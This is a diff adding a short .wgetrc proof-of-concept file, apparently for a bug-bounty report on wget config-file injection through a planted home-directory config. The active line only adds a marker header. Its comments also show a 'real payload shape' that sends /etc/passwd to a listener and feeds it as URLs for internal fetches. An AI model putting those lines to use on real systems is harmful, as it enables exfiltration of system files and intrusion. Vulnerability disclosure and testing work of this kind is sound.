@@ -1,0 +1,13 @@
+# Safe PoC -> x8bitranjit
+# Wget config-file injection: if you can plant .wgetrc in a directory the
+# target's jobs run wget FROM (home of a cron/systemd user - via traversal
+# write or upload-to-home), every subsequent wget obeys YOUR config.
+#
+# BENIGN PROOF (shipped): adds a marker header to every wget request -
+# observable at any endpoint that echoes headers (or your OOB listener).
+# WHAT TO EDIT: the header value / listener host.
+#
+# REAL PAYLOAD SHAPE (authorized only, never in bounty):
+#   post_file = /etc/passwd            (exfil to your listener via --post-file)
+#   input = /etc/passwd                (URLs from file = SSRF/internal fetch)
+header = X-Safe-PoC: x8bitranjit
